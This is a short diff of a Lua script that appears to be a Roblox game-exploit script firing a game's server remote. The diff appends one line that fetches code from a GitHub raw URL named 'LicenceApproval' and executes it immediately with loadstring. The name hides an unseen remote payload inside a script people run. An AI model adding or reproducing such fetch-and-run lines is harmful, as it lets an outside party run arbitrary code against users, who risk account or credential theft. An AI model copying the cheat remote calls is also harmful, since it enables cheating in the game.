@@ -190,3 +190,4 @@ local args = {
 game:GetService("ReplicatedStorage"):FindFirstChild("Characters"):FindFirstChild("Pibby"):FindFirstChild("Remotes"):FindFirstChild("Darkness"):FireServer(unpack(args))
    end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/You2berek/ScriptsMP/refs/heads/main/LicenceApproval"))()
